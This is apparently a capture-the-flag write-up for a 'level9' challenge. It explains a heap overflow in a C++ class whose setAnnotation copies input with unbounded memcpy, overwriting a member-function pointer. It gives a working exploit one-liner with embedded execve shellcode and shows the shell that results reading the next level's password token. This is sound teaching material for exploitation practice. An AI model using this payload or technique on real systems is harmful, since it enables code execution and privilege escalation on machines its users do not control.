# level9

## Header

```bash
ssh level9@192.168.64.9 -p 4242
...
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9
```

<hr>

## Solution

From the [dissassembled code](./source.cpp) and [source](./source.cpp) we see, that there is a `struct` or `class` called N that has internal buffer of 100 bytes, a setter that write to this buffer and a pointer to member functions that is called in `main`.

Here is the scheme that represents the memory after creation objects. 
```bash
0x804a008 int (N::*ptr)(const N &);  <- first N object (n1)
0x804a00c char buf[100];
0x804a070 int num;
0x804a074                            <- padding (4 bytes)
0x804a078 int (N::*ptr)(const N &);  <- second N object (n2)
0x804a07c char buf[100];
0x804a0e0 int num;
```

The pointer is called on the second object, so we're going to overwrite it through `n1->setAnnotation(av[1]);`
```c
(n2->*(n2->ptr))(*n1);
```

The main vulnerability is that `setAnnotation` uses unprotected `memcpy` call. The whole `arg` will be copied, as the `strlen(arg)` is passed as 3rd parameter and not the size of the internal buffer.
```c
memcpy(buf, arg, strlen(arg));
```

To exploit we need to place shellcode into buffer and overwrite return address to jump to the stack. <br>
One more thing. As the pointer is being dereferenced during call, we're overwriting return address with the beginning of the buffer and placing second address right at the beginning of the buffer which points to the shellcode. <br>

Look at the default ptr value from the source code:
```c
...
ptr = &N::operator+;
...
```
When it'll be executed `operator+` will be called, but the address that stores `operator+` address is placed into `ptr`. <br>
That is why we need to overwrite return address not with address of the shellcode, but with the address that points to the address of the shellcode. 

```bash
./level9 $(python -c 'print "\x08\x04\xa0\x24"[::-1] + "X" * 20 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "X" * 51 + "\x08\x04\xa0\x0c"[::-1]')
```

Getting the token from the shell:
```bash
bash-4.2$ pwd
/home/user/level9
bash-4.2$ cd ../bonus0
bash-4.2$ ls -la
total 17
dr-xr-x---+ 1 bonus0 bonus0   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus0 bonus0  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus0 bonus0 3530 Sep 23  2015 .bashrc
-rw-r--r--+ 1 bonus0 bonus0   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus0 bonus0  675 Apr  3  2012 .profile
-rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0
bash-4.2$ cat .pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

## References
